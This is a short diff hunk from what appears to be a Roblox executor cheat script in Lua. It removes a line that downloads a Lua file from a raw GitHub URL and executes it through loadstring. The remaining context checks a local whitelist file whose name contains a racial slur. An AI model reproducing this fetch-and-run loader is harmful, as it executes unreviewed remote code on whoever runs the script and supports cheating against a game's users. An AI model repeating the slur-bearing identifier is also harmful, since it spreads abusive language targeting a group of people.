@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/ben437/fat/main/fix.lua'))()
+
 
 local filename = "niggerv2whitlisted"
 if readfile(filename) == nil then
